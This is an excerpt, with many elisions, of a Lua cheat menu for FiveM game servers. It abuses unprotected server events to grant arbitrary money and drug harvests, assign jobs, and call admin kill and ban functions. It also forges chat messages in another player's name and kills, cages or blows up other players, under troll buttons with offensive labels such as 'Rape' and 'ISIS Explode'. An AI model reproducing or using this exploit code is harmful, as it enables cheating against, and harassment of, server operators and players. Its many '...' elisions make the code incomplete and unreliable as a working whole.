			elseif proxy.CheckBox('Engine Torque boost ~h~~g~x256', Torque256, function(enabled)
				Torque256 = enabled
			end) then
			elseif proxy.CheckBox('Engine Torque boost ~h~~g~x512', Torque512, function(enabled)
				Torque512 = enabled
			end) then
			end
				...
				proxy.Display()
            elseif proxy.IsMenuOpened("VehBoostMenu") then
                if proxy.Button('Engine Power boost ~r~RESET') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif proxy.Button('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif proxy.Button('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif proxy.Button('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif proxy.Button('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif proxy.Button('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif proxy.Button('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif proxy.Button('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif proxy.Button('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			elseif proxy.Button('Engine Power boost  ~g~ULTIMATE') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
			end
				
               proxy.Display()
			elseif proxy.IsMenuOpened("Models") then
			 
								if proxy.ComboBox("~h~~b~Male Model", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
                    currentPedd = currentIndex
                    selectedPedd = selectedIndex
                end)
                then
				elseif proxy.Button("Selected ~b~> ") then
					Deer.Destroy()
		Wait(100)
    ...
    SetModelAsNoLongerNeeded(model1)
				elseif proxy.ComboBox("~h~~p~Female Model", peds3, currentPeddd, selectedPeddd, function(currentIndex, selectedIndex)
                    currentPeddd = currentIndex
                    selectedPeddd = selectedIndex
                end)
                then
				elseif proxy.Button("Selected ~p~>") then
		Deer.Destroy()
		Wait(100)
    ...
    SetModelAsNoLongerNeeded(model5)
				elseif proxy.ComboBox("~h~~o~Animal Model", peds4, currentPedddd, selectedPedddd, function(currentIndex, selectedIndex)
                    currentPedddd = currentIndex
                    selectedPedddd = selectedIndex
                end)
                then
	elseif proxy.Button("Selected ~o~> ") then
			Deer.Destroy()
		Wait(100)
    ...
    SetModelAsNoLongerNeeded(model6)
		elseif proxy.Button("Spawn ~r~Deer ~s~And Ride") then
     Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
				elseif proxy.Button("~g~Reset Model To FiveM Player") then
						Deer.Destroy()
		Wait(100)
	...
	elseif proxy.Button("Change To ~y~Trevor") then
			Deer.Destroy()
		Wait(100)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model1)
	elseif proxy.Button("Change To ~b~Michael") then
			Deer.Destroy()
		Wait(100)
	...
	elseif proxy.Button("Change To ~g~Franklin") then
			Deer.Destroy()
		Wait(100)
	...
	elseif proxy.Button("Change To ~r~Alien") then
			Deer.Destroy()
		Wait(100)
	...
	elseif proxy.Button("Change To ~h~Bigfoot") then
			Deer.Destroy()
		Wait(100)
	...
	elseif proxy.Button("Change To ~p~Clown") then
			...
			elseif proxy.Button("Change To ~r~Stripper") then
			local model = "s_f_y_stripper_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif proxy.Button("Change To ~b~Cop") then
			local model = "s_m_y_cop_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif proxy.Button("Change To ~o~Chimp") then
			local model = "a_c_chimp"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif proxy.Button("Change To ~g~Alien") then
			local model = "s_m_m_movalien_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif proxy.Button("Change To ~p~Pongo") then
			local model = "u_m_y_pogo_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif proxy.Button("Change To ~o~Babyd") then
	...
	elseif proxy.Button("~h~Randomize ~r~Model") then
				SetPedRandomComponentVariation(PlayerPedId(), true)

	elseif proxy.Button("Change Clothes (~g~ESX~s~) (NOT TESTED)") then
    TriggerEvent('esx_skin:openSaveableMenu')
				...
				proxy.Display()
			elseif proxy.IsMenuOpened("ServerMenu") then
				if proxy.MenuButton("~s~Menu ~h~~r~JOBS", "RecrutarPlayers") then
				elseif proxy.MenuButton("~s~Menu ~b~~h~BOSS", "ESXBoss") then
				elseif proxy.MenuButton("~s~Menu ~g~~h~MONEY", "ESXMoney") then
				elseif proxy.MenuButton("~s~Menu ~p~~h~DRUGS", "ESXDrugs") then
				elseif proxy.MenuButton("~s~Menu ~o~~h~OTHERS", "ESXMisc") then
				end
				

				proxy.Display()
			elseif proxy.IsMenuOpened("ESXBoss") then
				if proxy.Button("~c~~h~Mechanic~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif proxy.Button("~b~~h~Police~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif proxy.Button("~r~~h~Ambulance~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif proxy.Button("~y~~h~Taxi~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif proxy.Button("~g~~h~Real Estate~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif proxy.Button("~p~~h~Gang~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif proxy.Button("~o~~h~Car Dealer~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif proxy.Button("~y~~h~Banker~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif proxy.Button("~c~~h~Mafia~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif proxy.Button("~g~~h~ESX ~y~Custom Boss Menu") then
				...
				proxy.Display()
			elseif proxy.IsMenuOpened("ESXMoney") then
				if proxy.Button("~h~~g~MONEY ~s~~h~BEST") then
			...
			elseif proxy.Button("~g~~h~MONEY ~s~1") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~2") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~3") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~4") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~5") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~6") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~7") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~8") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif proxy.Button("~g~~h~MONEY ~s~9") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~10") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~11") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~12") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~13") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif proxy.Button("~g~~h~MONEY ~s~14") then
					...
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
			elseif proxy.Button("~g~~h~MONEY ~s~15") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif proxy.Button("~g~~h~MONEY ~s~16") then
				...
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
			elseif proxy.Button("~s~Bank ~r~~h~Deposit") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("bank:deposit", result)
				end
			elseif proxy.Button("~s~Bank ~r~~h~Withdraw ") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
			...
			proxy.Display()
				elseif proxy.IsMenuOpened("ESXMisc") then
				    if proxy.Button("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
					...
					elseif proxy.Button("~g~~h~ESX ~w~Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif proxy.Button("~g~~h~ESX ~w~Get all licenses Drive") then
                ...
                elseif proxy.Button("~g~~h~ESX ~w~Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
				elseif proxy.Button("~h~Send Discord Message") then
				...
				elseif proxy.Button("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end
				

				proxy.Display()
			elseif proxy.IsMenuOpened("MiscServerOptions") then
				if proxy.Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif proxy.Button("~h~Send Police Car Advert") then
				...
				proxy.Display()
			elseif proxy.IsMenuOpened("VRPOptions") then
				if proxy.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif proxy.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif proxy.Button("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif proxy.Button("~r~~h~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif proxy.Button("~r~~h~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
				...
				proxy.Display()
			elseif proxy.IsMenuOpened("ESXDrugs") then
				if proxy.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
				elseif proxy.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
				elseif proxy.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
				elseif proxy.Button("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
				elseif proxy.Button("~h~~w~Transform ~w~Coke ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')																			
				elseif proxy.Button("~h~~w~Sell ~w~Coke ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
				elseif proxy.Button("~h~~r~Harvest Meth ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
				elseif proxy.Button("~h~~r~Transform Meth ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
				elseif proxy.Button("~h~~r~Sell Meth ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
				elseif proxy.Button("~h~~p~Harvest Opium ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
				elseif proxy.Button("~h~~p~Transform Opium ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
				elseif proxy.Button("~h~~p~Sell Opium ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
				elseif proxy.Button("~h~~g~Money Wash ~c~(x10)") then
					...
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif proxy.Button("~r~~h~Stop all ~c~(Drugs)") then
					...
					elseif proxy.Button("~h~~g~Sell Money Wash ~s~new") then
				...
				proxy.Display()
			elseif proxy.IsMenuOpened("RecrutarPlayers") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and proxy.MenuButton("~h~~r~-»  ~s~"..GetPlayerName(i).."", 'RecrutarPlayersOptions') then
						SelectedPlayer = i
					end
				end
				
				proxy.Display()
			elseif proxy.IsMenuOpened("RecrutarPlayersOptions") then
				proxy.SetSubTitle("RecrutarPlayersOptions", "Recrutar Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
				if proxy.Button("~r~Remove job") then
                    TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(SelectedPlayer))
			    elseif proxy.Button("~s~Recruit~c~~h~ Mechanic") then
			...
			elseif proxy.Button("~s~Recruit~b~~h~ Police") then
			...
			elseif proxy.Button("~s~Recruit~c~~h~ Mafia") then
			...
			elseif proxy.Button("~s~Recruit~p~~h~ Gang") then
			...
			elseif proxy.Button("~s~Recruit~r~~h~ Inem") then
			...
			elseif proxy.Button("~h~Custom Recruit") then
				...
				proxy.Display()
			elseif proxy.IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and proxy.MenuButton("~h~ID: ~r~[ "..GetPlayerServerId(i).." ] ~s~"..GetPlayerName(i).."~h~~y~ » "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~s~[~r~DEAD~s~]" or "~s~[ ~g~ALIVE~s~ ]"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
				...
				proxy.Display()
			elseif proxy.IsMenuOpened("PlayerOptionsMenu") then
				proxy.SetSubTitle("PlayerOptionsMenu", "~h~Player ~s~~r~[" .. GetPlayerName(SelectedPlayer) .. "~r~]")
				if proxy.Button("~h~~r~[~s~ SPECTATE ~h~~r~]", (Spectating and "~r~[ON]")) then
					SpectatePlayer(SelectedPlayer)
				elseif proxy.Button("~r~→  ~y~Teleport To Player") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                elseif proxy.MenuButton("~r~→  ~s~Troll Options", "PlayerTrollMenu") then					
				elseif proxy.Button("~g~Spam Msg") then
				...
				elseif proxy.Button("~g~Give ~s~Money") then
				...
				elseif proxy.Button("~g~Revive ~h~~g~ESX") then
                    ...
                    DoScreenFadeIn(800)
					elseif proxy.Button('~g~Revive ~h~~b~VRP') then
			    ...
			    elseif proxy.Button("~h~~r~Kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0) 
				elseif proxy.Button('Fire') then
				    FirePlayer(SelectedPlayer)
				elseif proxy.Button("~b~Open inventory ~s~new") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif proxy.Button("Jail") then		
				...
				elseif proxy.Button("Unjail") then
				...
				elseif proxy.Button("~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
					end
					elseif proxy.Button("~r~Remove All Weapons") then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
				elseif proxy.MenuButton("Weapon Menu", "SingleWepPlayer") then
				elseif proxy.Button("Spawn Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
				...
				elseif proxy.Button('~h~Clone Car') then
                    ClonePedVeh()
				elseif proxy.Button("~b~Cuff Player") then
						...
						TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
				elseif proxy.Button("~r~MelloTrainer ~s~KILL") then
					TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
				elseif proxy.Button("~r~MelloTrainer ~s~BAN") then
				...
				elseif proxy.Button("~r~MelloTrainer ~s~KICK") then
				...
				proxy.Display()
                elseif proxy.IsMenuOpened("PlayerTrollMenu") then
				 
                    if proxy.Button ("Fake Chat Message") then
                        local cX=KeyboardInput("Enter message to send","",100)
                        local cY=GetPlayerName(selectedPlayer)
                        if cX then
                            TriggerServerEvent("_chat:messageEntered",cY,{0,0x99,255},cX)
                        end
						elseif proxy.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
				elseif proxy.Button("Ram w/ Custom Vehicle") then
				...
				elseif proxy.Button('~y~Explode ~s~Vehicle') then
                ...
                elseif proxy.Button('~r~Banana ~p~Party') then
                ...
                elseif proxy.Button('~r~ISIS Explode') then
				...
				elseif proxy.Button("Small invisible Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                elseif proxy.Button('~r~Rape') then
                ...
                elseif proxy.Button('~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    ...
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif proxy.Button('Wall ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif proxy.Button('Wall ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif proxy.Button('~r~Attack UFO ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
				...
				elseif proxy.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                ...
                elseif proxy.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
					...
					elseif proxy.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif proxy.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                ...
                elseif proxy.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
					...
					elseif proxy.Button("Rain Agressive NPC") then
                    ...
                    then
					elseif proxy.Button("~h~~b~-- Vehicle --") then
				elseif proxy.Button("Kick ~b~Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
				elseif proxy.Button("Fuck ~s~Engine") then
				...
				elseif proxy.Button("~s~Repair ~b~Vehicle") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
				...
				elseif proxy.Button("~s~Fuck ~b~Car ") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
						...
						SetVehicleNumberPlateText(playerVeh, "proxy")
			    ...
			    elseif proxy.Button("~r~Explode ~b~Vehicle") then	
				 if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                    ...
                    proxy.Display()
                elseif proxy.IsMenuOpened("SpawnPropsMenu") then
                    if proxy.CheckBox(
                    ...
                    then
                    elseif proxy.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif proxy.Button("Weed") then
                    ...
                    elseif proxy.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif proxy.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    proxy.Display()
            elseif proxy.IsMenuOpened("VehicleRamMenu") then
                if proxy.Button("Futo") then
                ...
                elseif proxy.Button("Bus") then
                    ...
                    proxy.Display()
            elseif proxy.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if proxy.Button(allWeapons[i]) then
